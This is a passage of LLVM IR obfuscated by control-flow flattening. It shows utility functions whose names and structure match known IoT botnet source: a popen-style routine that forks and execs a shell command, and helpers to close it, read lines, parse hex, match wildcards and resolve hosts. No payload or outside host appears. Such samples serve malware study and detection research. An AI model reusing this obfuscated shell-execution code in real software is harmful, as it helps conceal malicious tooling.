    i32 840600032, label %73
    i32 1572435079, label %79
    i32 -939512770, label %84
    i32 1889813414, label %91
    i32 -1279829574, label %95
    i32 56177418, label %100
    i32 465978484, label %107
    i32 -1199393875, label %111
    i32 1970085525, label %NewDefault
    i32 1257463015, label %114
    i32 682683810, label %120
    i32 -1950363455, label %126
    i32 1456753299, label %132
    i32 -27536729, label %139
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %13 = icmp ne i32 %.reload, 114
  %14 = select i1 %13, i32 227992776, i32 415671261
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i8*, i8** %5, align 8
  %17 = load i8, i8* %16, align 1
  %18 = zext i8 %17 to i32
  %19 = icmp ne i32 %18, 119
  %20 = select i1 %19, i32 21426558, i32 415671261
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  %22 = load i8*, i8** %5, align 8
  %23 = getelementptr inbounds i8, i8* %22, i64 1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 0
  %27 = select i1 %26, i32 21426558, i32 320234309
  store i32 %27, i32* %switchVar
  br label %loopEnd

; <label>:28:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i32 0, i32 0
  %31 = call i32 @pipe(i32* %30) #2
  %32 = icmp slt i32 %31, 0
  %33 = select i1 %32, i32 -1105529878, i32 -615782845
  store i32 %33, i32* %switchVar
  br label %loopEnd

; <label>:34:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:35:                                     ; preds = %loopEntry
  %36 = load i32*, i32** @fdopen_pids, align 8
  %37 = icmp eq i32* %36, null
  %38 = select i1 %37, i32 -1902564591, i32 31910406
  store i32 %38, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = call i32 @getdtablesize() #2
  store i32 %40, i32* %8, align 4
  %41 = icmp sle i32 %40, 0
  %42 = select i1 %41, i32 2075059146, i32 -2088557560
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i32, i32* %8, align 4
  %46 = sext i32 %45 to i64
  %47 = mul i64 %46, 4
  %48 = trunc i64 %47 to i32
  %49 = zext i32 %48 to i64
  %50 = call noalias i8* @malloc(i64 %49) #2
  %51 = bitcast i8* %50 to i32*
  store i32* %51, i32** @fdopen_pids, align 8
  %52 = icmp eq i32* %51, null
  %53 = select i1 %52, i32 1546163093, i32 1804525972
  store i32 %53, i32* %switchVar
  br label %loopEnd

; <label>:54:                                     ; preds = %loopEntry
  store i32 -1, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:55:                                     ; preds = %loopEntry
  %56 = load i32*, i32** @fdopen_pids, align 8
  %57 = bitcast i32* %56 to i8*
  %58 = load i32, i32* %8, align 4
  %59 = sext i32 %58 to i64
  %60 = mul i64 %59, 4
  call void @llvm.memset.p0i8.i64(i8* %57, i8 0, i64 %60, i32 1, i1 false)
  store i32 31910406, i32* %switchVar
  br label %loopEnd

; <label>:61:                                     ; preds = %loopEntry
  %62 = call i32 @vfork() #11
  store i32 %62, i32* %.reg2mem4
  %.reload8 = load volatile i32, i32* %.reg2mem4
  store i32 %.reload8, i32* %9, align 4
  store i32 1122761256, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload7 = load volatile i32, i32* %.reg2mem4
  %Pivot = icmp slt i32 %.reload7, 0
  %63 = select i1 %Pivot, i32 -831375405, i32 -1567168592
  store i32 %63, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload5 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf2 = icmp eq i32 %.reload5, 0
  %64 = select i1 %SwitchLeaf2, i32 840600032, i32 1970085525
  store i32 %64, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload6 = load volatile i32, i32* %.reg2mem4
  %SwitchLeaf = icmp eq i32 %.reload6, -1
  %65 = select i1 %SwitchLeaf, i32 -1932499248, i32 1970085525
  store i32 %65, i32* %switchVar
  br label %loopEnd

; <label>:66:                                     ; preds = %loopEntry
  %67 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %68 = load i32, i32* %67, align 4
  %69 = call i32 @close(i32 %68)
  %70 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %71 = load i32, i32* %70, align 4
  %72 = call i32 @close(i32 %71)
  store i32 -1, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:73:                                     ; preds = %loopEntry
  %74 = load i8*, i8** %5, align 8
  %75 = load i8, i8* %74, align 1
  %76 = zext i8 %75 to i32
  %77 = icmp eq i32 %76, 114
  %78 = select i1 %77, i32 1572435079, i32 -1279829574
  store i32 %78, i32* %switchVar
  br label %loopEnd

; <label>:79:                                     ; preds = %loopEntry
  %80 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %81 = load i32, i32* %80, align 4
  %82 = icmp ne i32 %81, 1
  %83 = select i1 %82, i32 -939512770, i32 1889813414
  store i32 %83, i32* %switchVar
  br label %loopEnd

; <label>:84:                                     ; preds = %loopEntry
  %85 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %86 = load i32, i32* %85, align 4
  %87 = call i32 @dup2(i32 %86, i32 1) #2
  %88 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %89 = load i32, i32* %88, align 4
  %90 = call i32 @close(i32 %89)
  store i32 1889813414, i32* %switchVar
  br label %loopEnd

; <label>:91:                                     ; preds = %loopEntry
  %92 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %93 = load i32, i32* %92, align 4
  %94 = call i32 @close(i32 %93)
  store i32 -1199393875, i32* %switchVar
  br label %loopEnd

; <label>:95:                                     ; preds = %loopEntry
  %96 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %97 = load i32, i32* %96, align 4
  %98 = icmp ne i32 %97, 0
  %99 = select i1 %98, i32 56177418, i32 465978484
  store i32 %99, i32* %switchVar
  br label %loopEnd

; <label>:100:                                    ; preds = %loopEntry
  %101 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %102 = load i32, i32* %101, align 4
  %103 = call i32 @dup2(i32 %102, i32 0) #2
  %104 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %105 = load i32, i32* %104, align 4
  %106 = call i32 @close(i32 %105)
  store i32 465978484, i32* %switchVar
  br label %loopEnd

; <label>:107:                                    ; preds = %loopEntry
  %108 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %109 = load i32, i32* %108, align 4
  %110 = call i32 @close(i32 %109)
  store i32 -1199393875, i32* %switchVar
  br label %loopEnd

; <label>:111:                                    ; preds = %loopEntry
  %112 = load i8*, i8** %4, align 8
  %113 = call i32 (i8*, i8*, ...) @execl(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.342, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.343, i32 0, i32 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.344, i32 0, i32 0), i8* %112, i8* null) #2
  call void @_exit(i32 127) #12
  unreachable

NewDefault:                                       ; preds = %loopEntry
  store i32 1257463015, i32* %switchVar
  br label %loopEnd

; <label>:114:                                    ; preds = %loopEntry
  %115 = load i8*, i8** %5, align 8
  %116 = load i8, i8* %115, align 1
  %117 = zext i8 %116 to i32
  %118 = icmp eq i32 %117, 114
  %119 = select i1 %118, i32 682683810, i32 -1950363455
  store i32 %119, i32* %switchVar
  br label %loopEnd

; <label>:120:                                    ; preds = %loopEntry
  %121 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %122 = load i32, i32* %121, align 4
  store i32 %122, i32* %6, align 4
  %123 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %124 = load i32, i32* %123, align 4
  %125 = call i32 @close(i32 %124)
  store i32 1456753299, i32* %switchVar
  br label %loopEnd

; <label>:126:                                    ; preds = %loopEntry
  %127 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 1
  %128 = load i32, i32* %127, align 4
  store i32 %128, i32* %6, align 4
  %129 = getelementptr inbounds [2 x i32], [2 x i32]* %7, i64 0, i64 0
  %130 = load i32, i32* %129, align 4
  %131 = call i32 @close(i32 %130)
  store i32 1456753299, i32* %switchVar
  br label %loopEnd

; <label>:132:                                    ; preds = %loopEntry
  %133 = load i32, i32* %9, align 4
  %134 = load i32*, i32** @fdopen_pids, align 8
  %135 = load i32, i32* %6, align 4
  %136 = sext i32 %135 to i64
  %137 = getelementptr inbounds i32, i32* %134, i64 %136
  store i32 %133, i32* %137, align 4
  %138 = load i32, i32* %6, align 4
  store i32 %138, i32* %3, align 4
  store i32 -27536729, i32* %switchVar
  br label %loopEnd

; <label>:139:                                    ; preds = %loopEntry
  %140 = load i32, i32* %3, align 4
  ret i32 %140

loopEnd:                                          ; preds = %132, %126, %120, %114, %NewDefault, %107, %100, %95, %91, %84, %79, %73, %66, %LeafBlock, %LeafBlock1, %NodeBlock, %61, %55, %54, %44, %43, %39, %35, %34, %29, %28, %21, %15, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @pipe(i32*) #4

; Function Attrs: nounwind
declare i32 @getdtablesize() #4

; Function Attrs: nounwind returns_twice
declare i32 @vfork() #6

declare i32 @close(i32) #3

; Function Attrs: nounwind
declare i32 @dup2(i32, i32) #4

; Function Attrs: nounwind
declare i32 @execl(i8*, i8*, ...) #4

; Function Attrs: noreturn
declare void @_exit(i32) #7

; Function Attrs: noinline nounwind uwtable
define i32 @fdpclose(i32) #0 {
  %.reg2mem = alloca i32*
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.__sigset_t, align 8
  %6 = alloca %struct.__sigset_t, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.in_addr, align 4
  store i32 %0, i32* %3, align 4
  %10 = load i32*, i32** @fdopen_pids, align 8
  store i32* %10, i32** %.reg2mem
  %switchVar = alloca i32
  store i32 1275678309, i32* %switchVar
  %.reg2mem2 = alloca i1
  %.reg2mem4 = alloca i32
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 1275678309, label %first
    i32 -2085901164, label %13
    i32 -248642168, label %21
    i32 1566194831, label %22
    i32 272791468, label %30
    i32 -37717843, label %37
    i32 -256175055, label %41
    i32 -47715470, label %45
    i32 -1907805780, label %47
    i32 -863915475, label %56
    i32 -2051978033, label %57
    i32 258868298, label %64
    i32 -815404395, label %65
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

first:                                            ; preds = %loopEntry
  %.reload = load volatile i32*, i32** %.reg2mem
  %11 = icmp eq i32* %.reload, null
  %12 = select i1 %11, i32 -248642168, i32 -2085901164
  store i32 %12, i32* %switchVar
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32*, i32** @fdopen_pids, align 8
  %15 = load i32, i32* %3, align 4
  %16 = sext i32 %15 to i64
  %17 = getelementptr inbounds i32, i32* %14, i64 %16
  %18 = load i32, i32* %17, align 4
  %19 = icmp eq i32 %18, 0
  %20 = select i1 %19, i32 -248642168, i32 1566194831
  store i32 %20, i32* %switchVar
  br label %loopEnd

; <label>:21:                                     ; preds = %loopEntry
  store i32 -1, i32* %2, align 4
  store i32 -815404395, i32* %switchVar
  br label %loopEnd

; <label>:22:                                     ; preds = %loopEntry
  %23 = load i32, i32* %3, align 4
  %24 = call i32 @close(i32 %23)
  %25 = call i32 @sigemptyset(%struct.__sigset_t* %6) #2
  %26 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 2) #2
  %27 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 3) #2
  %28 = call i32 @sigaddset(%struct.__sigset_t* %6, i32 1) #2
  %29 = call i32 @sigprocmask(i32 0, %struct.__sigset_t* %6, %struct.__sigset_t* %5) #2
  store i32 272791468, i32* %switchVar
  br label %loopEnd

; <label>:30:                                     ; preds = %loopEntry
  %31 = load i32*, i32** @fdopen_pids, align 8
  %32 = load i32, i32* %3, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i32, i32* %31, i64 %33
  %35 = load i32, i32* %34, align 4
  %36 = call i32 @waitpid(i32 %35, i32* %7, i32 0)
  store i32 %36, i32* %8, align 4
  store i32 -37717843, i32* %switchVar
  br label %loopEnd

; <label>:37:                                     ; preds = %loopEntry
  %38 = load i32, i32* %8, align 4
  %39 = icmp eq i32 %38, -1
  %40 = select i1 %39, i32 -256175055, i32 -47715470
  store i32 %40, i32* %switchVar
  store i1 false, i1* %.reg2mem2
  br label %loopEnd

; <label>:41:                                     ; preds = %loopEntry
  %42 = call i32* @__errno_location() #13
  %43 = load i32, i32* %42, align 4
  %44 = icmp eq i32 %43, 4
  store i32 -47715470, i32* %switchVar
  store i1 %44, i1* %.reg2mem2
  br label %loopEnd

; <label>:45:                                     ; preds = %loopEntry
  %.reload3 = load i1, i1* %.reg2mem2
  %46 = select i1 %.reload3, i32 272791468, i32 -1907805780
  store i32 %46, i32* %switchVar
  br label %loopEnd

; <label>:47:                                     ; preds = %loopEntry
  %48 = call i32 @sigprocmask(i32 2, %struct.__sigset_t* %5, %struct.__sigset_t* null) #2
  %49 = load i32*, i32** @fdopen_pids, align 8
  %50 = load i32, i32* %4, align 4
  %51 = sext i32 %50 to i64
  %52 = getelementptr inbounds i32, i32* %49, i64 %51
  store i32 0, i32* %52, align 4
  %53 = load i32, i32* %8, align 4
  %54 = icmp eq i32 %53, -1
  %55 = select i1 %54, i32 -863915475, i32 -2051978033
  store i32 %55, i32* %switchVar
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  store i32 258868298, i32* %switchVar
  store i32 -1, i32* %.reg2mem4
  br label %loopEnd

; <label>:57:                                     ; preds = %loopEntry
  %58 = bitcast %struct.in_addr* %9 to i32*
  %59 = load i32, i32* %7, align 4
  store i32 %59, i32* %58, align 4
  %60 = bitcast %struct.in_addr* %9 to i32*
  %61 = load i32, i32* %60, align 4
  %62 = and i32 %61, 65280
  %63 = ashr i32 %62, 8
  store i32 258868298, i32* %switchVar
  store i32 %63, i32* %.reg2mem4
  br label %loopEnd

; <label>:64:                                     ; preds = %loopEntry
  %.reload5 = load i32, i32* %.reg2mem4
  store i32 %.reload5, i32* %2, align 4
  store i32 -815404395, i32* %switchVar
  br label %loopEnd

; <label>:65:                                     ; preds = %loopEntry
  %66 = load i32, i32* %2, align 4
  ret i32 %66

loopEnd:                                          ; preds = %64, %57, %56, %47, %45, %41, %37, %30, %22, %21, %13, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i32 @sigemptyset(%struct.__sigset_t*) #4

; Function Attrs: nounwind
declare i32 @sigaddset(%struct.__sigset_t*, i32) #4

; Function Attrs: nounwind
declare i32 @sigprocmask(i32, %struct.__sigset_t*, %struct.__sigset_t*) #4

declare i32 @waitpid(i32, i32*, i32) #3

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #8

; Function Attrs: noinline nounwind uwtable
define i8* @fdgets(i8*, i32, i32) #0 {
  %4 = alloca i8*, align 8
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  store i8* %0, i8** %4, align 8
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  store i32 1, i32* %7, align 4
  store i32 0, i32* %8, align 4
  %switchVar = alloca i32
  store i32 -535793525, i32* %switchVar
  %.reg2mem = alloca i1
  %.reg2mem2 = alloca i8*
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %3
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -535793525, label %9
    i32 812375477, label %13
    i32 763637965, label %18
    i32 -208648680, label %27
    i32 57499634, label %29
    i32 685347828, label %39
    i32 -1526758535, label %43
    i32 692874748, label %44
    i32 -2008152461, label %46
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:9:                                      ; preds = %loopEntry
  %10 = load i32, i32* %7, align 4
  %11 = icmp eq i32 %10, 1
  %12 = select i1 %11, i32 812375477, i32 -208648680
  store i32 %12, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %5, align 4
  %16 = icmp slt i32 %14, %15
  %17 = select i1 %16, i32 763637965, i32 -208648680
  store i32 %17, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = load i32, i32* %8, align 4
  %21 = sext i32 %20 to i64
  %22 = getelementptr inbounds i8, i8* %19, i64 %21
  %23 = getelementptr inbounds i8, i8* %22, i64 -1
  %24 = load i8, i8* %23, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp ne i32 %25, 10
  store i32 -208648680, i32* %switchVar
  store i1 %26, i1* %.reg2mem
  br label %loopEnd

; <label>:27:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %28 = select i1 %.reload, i32 57499634, i32 685347828
  store i32 %28, i32* %switchVar
  br label %loopEnd

; <label>:29:                                     ; preds = %loopEntry
  %30 = load i32, i32* %6, align 4
  %31 = load i8*, i8** %4, align 8
  %32 = load i32, i32* %8, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  %35 = call i64 @read(i32 %30, i8* %34, i64 1)
  %36 = trunc i64 %35 to i32
  store i32 %36, i32* %7, align 4
  %37 = load i32, i32* %8, align 4
  %38 = add nsw i32 %37, 1
  store i32 %38, i32* %8, align 4
  store i32 -535793525, i32* %switchVar
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %40 = load i32, i32* %7, align 4
  %41 = icmp eq i32 %40, 0
  %42 = select i1 %41, i32 -1526758535, i32 692874748
  store i32 %42, i32* %switchVar
  br label %loopEnd

; <label>:43:                                     ; preds = %loopEntry
  store i32 -2008152461, i32* %switchVar
  store i8* null, i8** %.reg2mem2
  br label %loopEnd

; <label>:44:                                     ; preds = %loopEntry
  %45 = load i8*, i8** %4, align 8
  store i32 -2008152461, i32* %switchVar
  store i8* %45, i8** %.reg2mem2
  br label %loopEnd

; <label>:46:                                     ; preds = %loopEntry
  %.reload3 = load i8*, i8** %.reg2mem2
  ret i8* %.reload3

loopEnd:                                          ; preds = %44, %43, %39, %29, %27, %18, %13, %9, %switchDefault
  br label %loopEntry
}

declare i64 @read(i32, i8*, i64) #3

; Function Attrs: noinline nounwind uwtable
define i64 @parseHex(i8*) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  store i8* %0, i8** %2, align 8
  store i64 0, i64* %3, align 8
  %switchVar = alloca i32
  store i32 -1394657524, i32* %switchVar
  %.reg2mem = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %1
  %switchVar1 = load i32, i32* %switchVar
  switch i32 %switchVar1, label %switchDefault [
    i32 -1394657524, label %4
    i32 -1178203350, label %10
    i32 -793629230, label %13
    i32 -1489446610, label %15
    i32 -1893493398, label %25
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

; <label>:4:                                      ; preds = %loopEntry
  %5 = load i8*, i8** %2, align 8
  %6 = load i8, i8* %5, align 1
  %7 = zext i8 %6 to i32
  %8 = icmp ne i32 %7, 0
  %9 = select i1 %8, i32 -1178203350, i32 -793629230
  store i32 %9, i32* %switchVar
  store i1 false, i1* %.reg2mem
  br label %loopEnd

; <label>:10:                                     ; preds = %loopEntry
  %11 = load i64, i64* %3, align 8
  %12 = icmp sge i64 %11, 0
  store i32 -793629230, i32* %switchVar
  store i1 %12, i1* %.reg2mem
  br label %loopEnd

; <label>:13:                                     ; preds = %loopEntry
  %.reload = load i1, i1* %.reg2mem
  %14 = select i1 %.reload, i32 -1489446610, i32 -1893493398
  store i32 %14, i32* %switchVar
  br label %loopEnd

; <label>:15:                                     ; preds = %loopEntry
  %16 = load i64, i64* %3, align 8
  %17 = shl i64 %16, 4
  %18 = load i8*, i8** %2, align 8
  %19 = getelementptr inbounds i8, i8* %18, i32 1
  store i8* %19, i8** %2, align 8
  %20 = load i8, i8* %18, align 1
  %21 = zext i8 %20 to i64
  %22 = getelementptr inbounds [256 x i64], [256 x i64]* @hextable, i64 0, i64 %21
  %23 = load i64, i64* %22, align 8
  %24 = or i64 %17, %23
  store i64 %24, i64* %3, align 8
  store i32 -1394657524, i32* %switchVar
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i64, i64* %3, align 8
  ret i64 %26

loopEnd:                                          ; preds = %15, %13, %10, %4, %switchDefault
  br label %loopEntry
}

; Function Attrs: noinline nounwind uwtable
define i32 @wildString(i8*, i8*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca i8*, align 8
  store i8* %0, i8** %4, align 8
  store i8* %1, i8** %5, align 8
  %6 = load i8*, i8** %4, align 8
  %7 = load i8, i8* %6, align 1
  %8 = zext i8 %7 to i32
  store i32 %8, i32* %.reg2mem
  %switchVar = alloca i32
  store i32 915713972, i32* %switchVar
  %.reg2mem12 = alloca i1
  %.reg2mem14 = alloca i1
  %.reg2mem16 = alloca i1
  %.reg2mem18 = alloca i1
  br label %loopEntry

loopEntry:                                        ; preds = %loopEnd, %2
  %switchVar7 = load i32, i32* %switchVar
  switch i32 %switchVar7, label %switchDefault [
    i32 915713972, label %NodeBlock5
    i32 288723148, label %NodeBlock
    i32 -534885009, label %LeafBlock3
    i32 1538092300, label %LeafBlock1
    i32 1089062826, label %LeafBlock
    i32 -407750298, label %14
    i32 403931423, label %18
    i32 -756811361, label %25
    i32 -968827622, label %31
    i32 -979459127, label %38
    i32 103028078, label %39
    i32 -720455755, label %42
    i32 994793573, label %48
    i32 -697169216, label %56
    i32 2120457878, label %NewDefault
    i32 -310206040, label %59
    i32 -1929111789, label %70
    i32 810123987, label %78
    i32 -903039465, label %81
  ]

switchDefault:                                    ; preds = %loopEntry
  br label %loopEnd

NodeBlock5:                                       ; preds = %loopEntry
  %.reload11 = load volatile i32, i32* %.reg2mem
  %Pivot6 = icmp slt i32 %.reload11, 42
  %9 = select i1 %Pivot6, i32 1089062826, i32 288723148
  store i32 %9, i32* %switchVar
  br label %loopEnd

NodeBlock:                                        ; preds = %loopEntry
  %.reload9 = load volatile i32, i32* %.reg2mem
  %Pivot = icmp slt i32 %.reload9, 63
  %10 = select i1 %Pivot, i32 1538092300, i32 -534885009
  store i32 %10, i32* %switchVar
  br label %loopEnd

LeafBlock3:                                       ; preds = %loopEntry
  %.reload = load volatile i32, i32* %.reg2mem
  %SwitchLeaf4 = icmp eq i32 %.reload, 63
  %11 = select i1 %SwitchLeaf4, i32 -720455755, i32 2120457878
  store i32 %11, i32* %switchVar
  br label %loopEnd

LeafBlock1:                                       ; preds = %loopEntry
  %.reload8 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf2 = icmp eq i32 %.reload8, 42
  %12 = select i1 %SwitchLeaf2, i32 403931423, i32 2120457878
  store i32 %12, i32* %switchVar
  br label %loopEnd

LeafBlock:                                        ; preds = %loopEntry
  %.reload10 = load volatile i32, i32* %.reg2mem
  %SwitchLeaf = icmp eq i32 %.reload10, 0
  %13 = select i1 %SwitchLeaf, i32 -407750298, i32 2120457878
  store i32 %13, i32* %switchVar
  br label %loopEnd

; <label>:14:                                     ; preds = %loopEntry
  %15 = load i8*, i8** %5, align 8
  %16 = load i8, i8* %15, align 1
  %17 = zext i8 %16 to i32
  store i32 %17, i32* %3, align 4
  store i32 -903039465, i32* %switchVar
  br label %loopEnd

; <label>:18:                                     ; preds = %loopEntry
  %19 = load i8*, i8** %4, align 8
  %20 = getelementptr inbounds i8, i8* %19, i64 1
  %21 = load i8*, i8** %5, align 8
  %22 = call i32 @wildString(i8* %20, i8* %21)
  %23 = icmp ne i32 %22, 0
  %24 = select i1 %23, i32 -756811361, i32 103028078
  store i32 %24, i32* %switchVar
  store i1 true, i1* %.reg2mem14
  br label %loopEnd

; <label>:25:                                     ; preds = %loopEntry
  %26 = load i8*, i8** %5, align 8
  %27 = load i8, i8* %26, align 1
  %28 = zext i8 %27 to i32
  %29 = icmp ne i32 %28, 0
  %30 = select i1 %29, i32 -968827622, i32 -979459127
  store i32 %30, i32* %switchVar
  store i1 false, i1* %.reg2mem12
  br label %loopEnd

; <label>:31:                                     ; preds = %loopEntry
  %32 = load i8*, i8** %4, align 8
  %33 = load i8*, i8** %5, align 8
  %34 = getelementptr inbounds i8, i8* %33, i64 1
  %35 = call i32 @wildString(i8* %32, i8* %34)
  %36 = icmp ne i32 %35, 0
  %37 = xor i1 %36, true
  store i32 -979459127, i32* %switchVar
  store i1 %37, i1* %.reg2mem12
  br label %loopEnd

; <label>:38:                                     ; preds = %loopEntry
  %.reload13 = load i1, i1* %.reg2mem12
  store i32 103028078, i32* %switchVar
  store i1 %.reload13, i1* %.reg2mem14
  br label %loopEnd

; <label>:39:                                     ; preds = %loopEntry
  %.reload15 = load i1, i1* %.reg2mem14
  %40 = xor i1 %.reload15, true
  %41 = zext i1 %40 to i32
  store i32 %41, i32* %3, align 4
  store i32 -903039465, i32* %switchVar
  br label %loopEnd

; <label>:42:                                     ; preds = %loopEntry
  %43 = load i8*, i8** %5, align 8
  %44 = load i8, i8* %43, align 1
  %45 = zext i8 %44 to i32
  %46 = icmp ne i32 %45, 0
  %47 = select i1 %46, i32 994793573, i32 -697169216
  store i32 %47, i32* %switchVar
  store i1 false, i1* %.reg2mem16
  br label %loopEnd

; <label>:48:                                     ; preds = %loopEntry
  %49 = load i8*, i8** %4, align 8
  %50 = getelementptr inbounds i8, i8* %49, i64 1
  %51 = load i8*, i8** %5, align 8
  %52 = getelementptr inbounds i8, i8* %51, i64 1
  %53 = call i32 @wildString(i8* %50, i8* %52)
  %54 = icmp ne i32 %53, 0
  %55 = xor i1 %54, true
  store i32 -697169216, i32* %switchVar
  store i1 %55, i1* %.reg2mem16
  br label %loopEnd

; <label>:56:                                     ; preds = %loopEntry
  %.reload17 = load i1, i1* %.reg2mem16
  %57 = xor i1 %.reload17, true
  %58 = zext i1 %57 to i32
  store i32 %58, i32* %3, align 4
  store i32 -903039465, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 -310206040, i32* %switchVar
  br label %loopEnd

; <label>:59:                                     ; preds = %loopEntry
  %60 = load i8*, i8** %4, align 8
  %61 = load i8, i8* %60, align 1
  %62 = zext i8 %61 to i32
  %63 = call i32 @toupper(i32 %62) #10
  %64 = load i8*, i8** %5, align 8
  %65 = load i8, i8* %64, align 1
  %66 = zext i8 %65 to i32
  %67 = call i32 @toupper(i32 %66) #10
  %68 = icmp eq i32 %63, %67
  %69 = select i1 %68, i32 -1929111789, i32 810123987
  store i32 %69, i32* %switchVar
  store i1 false, i1* %.reg2mem18
  br label %loopEnd

; <label>:70:                                     ; preds = %loopEntry
  %71 = load i8*, i8** %4, align 8
  %72 = getelementptr inbounds i8, i8* %71, i64 1
  %73 = load i8*, i8** %5, align 8
  %74 = getelementptr inbounds i8, i8* %73, i64 1
  %75 = call i32 @wildString(i8* %72, i8* %74)
  %76 = icmp ne i32 %75, 0
  %77 = xor i1 %76, true
  store i32 810123987, i32* %switchVar
  store i1 %77, i1* %.reg2mem18
  br label %loopEnd

; <label>:78:                                     ; preds = %loopEntry
  %.reload19 = load i1, i1* %.reg2mem18
  %79 = xor i1 %.reload19, true
  %80 = zext i1 %79 to i32
  store i32 %80, i32* %3, align 4
  store i32 -903039465, i32* %switchVar
  br label %loopEnd

; <label>:81:                                     ; preds = %loopEntry
  %82 = load i32, i32* %3, align 4
  ret i32 %82

loopEnd:                                          ; preds = %78, %70, %59, %NewDefault, %56, %48, %42, %39, %38, %31, %25, %18, %14, %LeafBlock, %LeafBlock1, %LeafBlock3, %NodeBlock, %NodeBlock5, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind readonly
declare i32 @toupper(i32) #1

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr*) #0 {
  %.reg2mem = alloca i32
  %3 = alloca i32, align 4
  %4 = alloca i8*, align 8
  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #2
  store i32 %8, i32* %.reg2mem
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
